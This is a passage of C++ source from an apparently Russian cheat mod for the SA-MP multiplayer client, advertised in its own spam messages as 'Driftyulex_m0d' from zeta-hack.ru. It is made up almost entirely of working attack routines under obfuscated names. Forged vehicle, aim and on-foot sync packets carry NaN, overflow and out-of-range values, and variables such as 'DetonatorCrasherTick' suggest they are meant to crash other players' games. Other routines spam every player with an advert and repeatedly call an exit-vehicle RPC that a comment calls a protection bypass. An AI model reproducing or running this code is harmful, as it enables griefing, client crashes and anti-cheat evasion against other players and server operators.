		 onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
		 onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
		 onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

		 onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
		 onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
		 onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

		 onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
		 onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
		 onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];

		 //vect3_zero(onSync.fMoveSpeed);// существует легенда что так варнинг на срп не летит
		 onSync.fPosition[2] -= 70;

		  BitStream bsData;
		 bsData.Write((BYTE)ID_VEHICLE_SYNC);
		 bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
		 g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		 
	 }
 }



 void cheat_handle_pickmaasssssswqzzq141aaazzz2323()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432 == 1 )  
  { 
	  static DWORD dwTime = 0;
		if (GetTickCount() - dwTime > 3000)
		{
			if ( g_Players->iIsListed[playerId] != 1 )
			if(g_Players->pRemotePlayer[playerId] == NULL)
			say("/pm %d Driftyulex_m0d by AlexDrift (WWW.ZETA-HACK.RU)", playerId);
			playerId++;
			dwTime = GetTickCount();
		}
	}
	else playerId = 0;
	return;
}
 
 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rere()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432erre == 1 )  
  { 
	  static DWORD dwTime = 0;
		if (GetTickCount() - dwTime > 3000)
		{
			if ( g_Players->iIsListed[playerId] != 1 )
			if(g_Players->pRemotePlayer[playerId] == NULL)
			say("/sms %d Driftyulex_m0d by AlexDrift (WWW.ZETA-HACK.RU)", playerId);
			playerId++;
			dwTime = GetTickCount();
		}
	}
	else playerId = 0;
	return;
}


 
 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rereqwer()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432erreqwer == 1 )  
  {  
	  stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData)); 
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.fAimZ = sqrt((float)-1);

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync,sizeof(stAimData));

			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
  }
  return;
}


 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rereqwerdfdf()
 {
	 static uint16_t playerId = 0;
	 traceLastFunc("cheat_handle_pickmaa()");
	 if (cheat_state->_generic.dssdsdsdsd23sasa23 == 1)  
	 {
		 /*stOnFootData onSync;
		 ZeroMemory(&onSync, sizeof(stOnFootData));

		 onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
		 onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

		 onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
		 onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
		 onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];

		 onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
		 onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
		 onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

		 onSync.sSurfingVehicleID = 2001;
		 //for (int i = 0; i < 1; i++)
			 //onSync.fSurfingOffsets[i] = NAN;

		 BitStream bsData;
		 bsData.Write((BYTE)ID_PLAYER_SYNC);
		 bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
		 g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);*/
	 }
	 return;
 }

 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rereqwe()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432erreqwe == 1 )  
  { 
	  static DWORD DetonatorCrasherTick = GetTickCount();
		static int iCamModeCount = 0;
		int iCameModeID[7] = { 7, 8, 34, 45, 46, 51, 65 };
		static bool bState = false;

		if (GetTickCount() - DetonatorCrasherTick < 1000)
		{
			if (!bState)
			{
				stOnFootData OnFootData;
				memcpy(&OnFootData, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
				OnFootData.sKeys = 128; // works only with key for aim
				OnFootData.byteCurrentWeapon = 40;
				 BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootData, sizeof(stOnFootData));
				g_DrifeitClient->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				bState = true;
			}
		}
		else
		{
			if (bState)
			{
				stOnFootData OnFootData;
				memcpy(&OnFootData, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
				OnFootData.fPosition[0] += 200000.f;
				OnFootData.fPosition[1] += 200000.f;

				OnFootData.sKeys = 128;
				OnFootData.byteCurrentWeapon = 40;
				 BitStream bsOnFoot;
				bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsOnFoot.Write((PCHAR)&OnFootData, sizeof(stOnFootData));
				g_DrifeitClient->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				bState = false;
			}
			if (GetTickCount() - DetonatorCrasherTick > 2000)
			{
				DetonatorCrasherTick = GetTickCount();
			}
		}


		stAimData AimData;
		memcpy(&AimData, &g_Players->pLocalPlayer->aimData, sizeof(stAimData));
		AimData.byteCamMode = iCameModeID[iCamModeCount];
		 BitStream bsAim;
		bsAim.Write((BYTE)ID_AIM_SYNC);
		bsAim.Write((PCHAR)&AimData, sizeof(stAimData));
		g_DrifeitClient->Send(&bsAim, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		iCamModeCount++;
		if (iCamModeCount >= 7)
			iCamModeCount = 0;

	}
}


 bool IsPlayerStreamed(uint16_t playerID)
{
	if (g_Players == NULL)
		return false;
	if (g_Players->iIsListed[playerID] != 1)
		return false;
	if (g_Players->pRemotePlayer[playerID] == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData == NULL)
		return false;
	if (g_Players->pRemotePlayer[playerID]->pPlayerData->pSAMP_Actor == NULL)
		return false;
	return true;
}

 

bool IsVehicleStreamed(uint16_t vehicleID)
{
	//if (g_Players->pLocalPlayer->sCurrentVehicleID == OLCheats->iVehicleID) { continue; }
	if (g_Vehicles->iIsListed[vehicleID] != 1)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID] == NULL)
		return false;
	if (g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle == NULL)
		return false;
	return true;
}

  
 static int iPlayerCrash = 0;
 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rereqw()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432erreqw == 1 )  
  { 
	  static DWORD AimCrasherTick = GetTickCount();
		if (GetTickCount() - AimCrasherTick < 167)
		{
			
			for (iPlayerCrash++; iPlayerCrash < SAMP_PLAYER_MAX; iPlayerCrash++)
			{
				if (g_Players != NULL
					&& iPlayerCrash != g_Players->sLocalPlayerID
					&& g_Players->pRemotePlayer[iPlayerCrash] != NULL
					&&	 g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData != NULL
					&& g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->bytePlayerState == PLAYER_STATE_DRIVER)
				{
					break;
				}
			}
			if (iPlayerCrash >= SAMP_PLAYER_MAX)
				iPlayerCrash = -1;
			if (iPlayerCrash != -1)
			{
				cheat_state_text("a");
				stInCarData InCarData;
				memset(&InCarData, 0, sizeof(stInCarData));
				InCarData.fVehicleHealth = 1000;
				InCarData.sVehicleID = g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->inCarData.sVehicleID;//work
				vect3_copy(g_Players->pRemotePlayer[iPlayerCrash]->pPlayerData->inCarData.fPosition, InCarData.fPosition);
				InCarData.bytePlayerHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
				InCarData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
				 BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCarData, sizeof(stInCarData));
				g_DrifeitClient->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			}
		}
		else
		{
			cheat_state_text("b");
			 BitStream bsOnFoot;
			bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
			bsOnFoot.Write((PCHAR)&g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
			g_DrifeitClient->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			stAimData AimData;
			memset(&AimData, 0, sizeof(stAimData));
			AimData.byteCamMode = 49;
			AimData.vecAimf1[2] = -1;
			 BitStream bsAim;
			bsAim.Write((BYTE)ID_AIM_SYNC);
			bsAim.Write((PCHAR)&AimData, sizeof(stAimData));
			g_DrifeitClient->Send(&bsAim, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			if (GetTickCount() - AimCrasherTick >= 333)
			{
				AimCrasherTick = GetTickCount();
			}
		}

	 

	 }}

 


 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rersasaejj()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432ersasarejj == 1 )  
  {  
	  SendWastedNotification(200, g_Players->sLocalPlayerID);
 
}			
  }


 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rersasae()  
{  
	static uint16_t playerId = 0;
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432ersasare == 1 )  
  {  
	
		stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;  
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0] + 0.5f;
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1] + 0.5f;
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2] + 0.5f;
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0] + 0.5f;
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1] + 0.5f;
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2] + 0.5f;
			
			onSync.fQuaternion[0] = random_float(-1, 1);
			onSync.fQuaternion[1] = random_float(-1, 1);
			onSync.fQuaternion[2] = random_float(-1, 1);
			onSync.fQuaternion[3] = random_float(-1, 1);
			
			onSync.fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
			
			
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
	
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			
  }}


 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rersasaebb()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432ersasarebb == 1 )  
  {  
	
		stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;  
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
			
			
			onSync.fTrainSpeed = (float)0xDDDDDDDDDDF0BDC1;
			
			
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
		
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			static int time = 0;
			if (GetTickCount() - 6000 > time)
			{
				 BitStream bStream;
			bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
			g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
			time = GetTickCount();
			}
  }}
 

 void cheat_handle_pickmaasssssswqzzq141aaazzz2323rersasaebb1()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss2432ersasarebbf == 1 )  
  {  
	static int time = 0;
			if (GetTickCount() - 100 > time)
			{
		stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;   
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
			
			
			onSync.fTrainSpeed = (float)0xDDDDDDDDDDF0BDC1;
			
			
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			time = GetTickCount();
			}
			static int timecc = 0;
			if (GetTickCount() - 4000 > timecc)
			{
			 BitStream bStream;
			bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
			g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
			timecc = GetTickCount();
			}
  }}








 void cheat_handle_pickmaasssssswqzzq141aaazzz4343()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss4343 == 1 )  
  { 
	 stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			onSync.fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
			
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			//for(int i = 0; i < 2; i++)
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

			
			static int time = 0;
			if (GetTickCount() - 1500 > time)
			{
			 BitStream bStream;
			bStream.Write(g_Players->pLocalPlayer->sCurrentVehicleID);                                        //---------> долгожданный ебучий обход защиты
			g_DrifeitClient->RPC(RPC_ExitVehicle, &bStream, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
			time = GetTickCount();
			}}}
      
 void cheat_handle_pickmaasssssswqzzq141aaa()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9 == 1 )  
  { 
	  stAimData aimSync;
	  ZeroMemory(&aimSync, sizeof(stAimData));
	  aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
	  aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
	  aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
	  aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
	  aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
	  aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
	  aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
	  aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
	  aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
	  aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
	  aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

	  aimSync.vecAimf1[0] = (float)0x7FFFFFFF;
	  aimSync.vecAimPos[0] = (float)0x7FFFFFFF;
	  aimSync.byteCamMode = 183;

	   BitStream bsData;
	  bsData.Write((BYTE)ID_AIM_SYNC);
	  bsData.Write((PCHAR)&aimSync, sizeof(stAimData));
	  
	  g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
  }}


void cheat_handle_pickmaasssssswqzzq141aa1112()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas11 == 1 )  
  { 
	   float *coord = ( cheat_state->state == CHEAT_STATE_VEHICLE ) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
	   static int time = 0;
		if (GetTickCount() - 200 > time)
		{
			stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor; 
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			onSync.fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
			
			struct actor_info	*pSelfActor = actor_info_get(ACTOR_SELF, 0);
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			//for(int i = 0; i < 2; i++)
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
		
			static int time = 0;
			if (GetTickCount() - 2300 > time)
			{
			float fPos[3], fSpeed[3];
			fPos[0] = coord[0];
			fPos[1] = coord[1];
			fPos[2] = coord[2] + 0.1f;
			SendFakeOnfootSyncData1(fPos, pSelfActor->hitpoints, 0,  fSpeed);
			time = GetTickCount();
			}
		}}}

void cheat_handle_pickmaasssssswqzzq141aa11121()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas12 == 1 )  
  { 
	  keybd_event(KEY_CAPITAL, 0, 0, 0);
  }
  return;
} 

int pad(eControllerAction key, eControllerType type)
{
	CControllerConfigManager	*pPadConfig = pGameInterface->GetControllerConfigManager();
	return pPadConfig->GetControllerKeyAssociatedWithAction(key, type);
}

void cheat_handle_pickmaasssssswqzzq141aa111211()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas13 == 1 )  
  { 
	  keybd_event(KEY_W, 0, 0, 0);
	  keybd_event(KEY_S, 0, 0, 0);
	  keybd_event(KEY_D, 0, 0, 0);
	  keybd_event(KEY_LCONTROL, 0, 0, 0);
  }
  return;
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzffff()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z111111 == 1 )  
  { 
	  float *coord = ( cheat_state->state == CHEAT_STATE_VEHICLE ) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
	stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor; 
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			onSync.fTrainSpeed = (float)0xFFFFFFFFFFF0BDC1;
			
			struct actor_info	*pSelfActor = actor_info_get(ACTOR_SELF, 0);
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			//for(int i = 0; i < 2; i++)
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
			 static int time = 0;
			if (GetTickCount() - 2000 > time)
			{
			float fPos[3], fSpeed[3];
			fPos[0] = coord[0];
			fPos[1] = coord[1];
			fPos[2] = coord[2] + 0.1f;
			SendFakeOnfootSyncData1(fPos, pSelfActor->hitpoints, 0,  fSpeed);
			time = GetTickCount();
			}}}



void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzffffvvv()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas131112z111111vvqqq == 1)
	{
		
		static DWORD time = GetTickCount();
		if (GetTickCount() - 1500 > time)
		{
			for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
			{
				if (g_Vehicles->iIsListed[v] != 1)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v] == NULL)
					continue;
				if (g_Vehicles->pSAMP_Vehicle[v]->pGTA_Vehicle == NULL)
					continue;
				int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
				struct vehicle_info *info = vehicle_info_get(car_id, 0);

				int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(info);
				if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID) continue;

				float fPos[3];
				vect3_copy(&info->base.matrix[4 * 3], fPos);

				fPos[0] += -5 + rand() % 5;
				fPos[1] += -5 + rand() % 5;
				fPos[2] += rand() % 10;

				float fSpeed[3];
				fSpeed[0] = sinf(fPos[0]) * 2;
				fSpeed[1] = cosf(fPos[1]) * 2;
				fSpeed[2] = cosf(fPos[2]) * 2;

				float fQuaternion[4] = { 0, 0, 0, 0 };

				g_DrifeitClient->SendMutantDriverSyncData(iSAMPVehicleID, fPos, fSpeed, fQuaternion);
				cheat_vehicle_teleport(info, fPos, gta_interior_id_get());
				info->speed[0] = fSpeed[0];
				info->speed[1] = fSpeed[1];
				time = GetTickCount();
			}
		}
	}
}


void cheat_handle_pickmaasssssswqzzq141aa11121kk1czzzfff()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131112z11111 == 1 )  
  { 
	  static int time = 0;
if (GetTickCount() - 1500 > time)
{
	  int anim = rand()%42;
	// Stop (0-1)
	if (anim == 0) { GTAfunc_LockActor(0); GTAfunc_DisembarkInstantly(); }
	else if (anim == 1) GTAfunc_PerformAnimation("PARACHUTE", "PARA_RIP_LOOP_O", 1, 0, 1, 0, 0, 0, 0, 0);

	// BSKTBALL (2)
	else if (anim == 2) GTAfunc_PerformAnimation("BSKTBALL", "BBALL_Net_Dnk_O", -1, 1, 1, 0, 0, 1, 0, 1);

	// GHANDS (3-12)
	else if (anim == 3) GTAfunc_PerformAnimation("GHANDS", "LHGsign1", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 4) GTAfunc_PerformAnimation("GHANDS", "LHGsign2", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 5) GTAfunc_PerformAnimation("GHANDS", "LHGsign3", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 6) GTAfunc_PerformAnimation("GHANDS", "LHGsign4", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 7) GTAfunc_PerformAnimation("GHANDS", "LHGsign5", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 8) GTAfunc_PerformAnimation("GHANDS", "RHGsign1", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 9) GTAfunc_PerformAnimation("GHANDS", "RHGsign2", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 10) GTAfunc_PerformAnimation("GHANDS", "RHGsign3", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 11) GTAfunc_PerformAnimation("GHANDS", "RHGsign4", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 12) GTAfunc_PerformAnimation("GHANDS", "RHGsign5", -1, 1, 1, 0, 0, 1, 0, 1);

	// PARACHUTE (13-22)
	else if (anim == 13) GTAfunc_PerformAnimation("PARACHUTE", "PARA_decel_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 14) GTAfunc_PerformAnimation("PARACHUTE", "PARA_float_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 15) GTAfunc_PerformAnimation("PARACHUTE", "PARA_Land_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 16) GTAfunc_PerformAnimation("PARACHUTE", "PARA_Land_Water_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 17) GTAfunc_PerformAnimation("PARACHUTE", "PARA_open_O", -1, 1, 1, 0, 0, 1, 0, 1);
	else if (anim == 18) GTAfunc_PerformAnimation("PARACHUTE", "PARA_Rip_Land_O", -1, 1, 1, 0, 0, 1, 0, 1);
